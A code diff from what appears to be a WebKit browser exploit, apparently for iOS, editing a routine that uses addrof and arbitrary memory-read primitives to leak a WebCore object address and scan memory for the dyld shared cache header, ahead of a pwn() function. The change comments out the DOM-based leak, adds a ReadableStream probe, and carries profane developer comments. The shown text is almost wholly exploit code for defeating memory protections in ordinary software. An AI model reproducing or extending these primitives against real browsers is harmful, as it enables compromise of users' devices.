@@ -645,7 +645,7 @@ var VM_PROT_EXECUTE = 0x4
         //never tried this method...
         //const audioCtx = new AudioContext();
 
-        var d = new AudioWorkletProcessor();
+        /*var d = new AudioWorkletProcessor();
         log('[*] Creating the HTMLDivElement wrapper...');
         //var d = oscillator;
         let ad_div = addrof(d);
@@ -658,9 +658,12 @@ var VM_PROT_EXECUTE = 0x4
         var anchor = memory.read_i64(v_tlb)
         var hdr = Sub(anchor, anchor.lo() & 0xfff);
         log('Webcore header @' + hdr); //dyld_cache_header
-        while(true)
+        */ //this wont be viable in our context as we can't access DOM Objects from a webworker dialect RIP.
+              let stream = new ReadableStream();
+        log(stream)
+        /*while(true)
         {
-        /*FUCK THIS TEAM!!! Whole time header is just the Webcore header not the fucking shared cache header!!!! A whole year of struggling to get this update to work just to find out it's fucking wrong...*/
+        FUCK THIS TEAM!!! Whole time header is just the Webcore header not the fucking shared cache header!!!! A whole year of struggling to get this update to work just to find out it's fucking wrong...
         if(strcmp(memory.read(hdr, 0x10), "dyld_v1   arm64")) //cache header magic
         //webcore header magic...
         {
@@ -669,7 +672,7 @@ var VM_PROT_EXECUTE = 0x4
         }
         hdr = Sub(hdr, new Int64(0x1000));
         }
-        log("dyld shared cache header @" + hdr);
+        log("dyld shared cache header @" + hdr);*/
         }
           function pwn() {
             try {
